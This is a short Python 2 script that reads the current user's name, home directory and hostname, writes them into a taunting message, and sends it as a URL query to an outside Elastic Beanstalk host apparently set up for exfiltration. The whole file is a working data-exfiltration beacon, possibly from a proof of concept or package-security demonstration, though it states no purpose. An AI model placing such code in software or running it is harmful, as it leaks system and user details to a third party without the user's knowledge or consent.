import urllib2
import urllib
import getpass
import socket
import os

user = getpass.getuser()
home = os.environ['HOME']
host = socket.gethostname()

info = {"user": user, "home": home, "host": host}

message = ("Hello, I am {user}, my things are in {home}." +
            " Come find me on {host}!").format(**info)

args = {'msg': message }
data = urllib.urlencode(args)
req = urllib2.urlopen('http://exfiltration-env.ug5fvfwjza.us-west-2.elasticbeanstalk.com/log?' + data)
response = req.read()
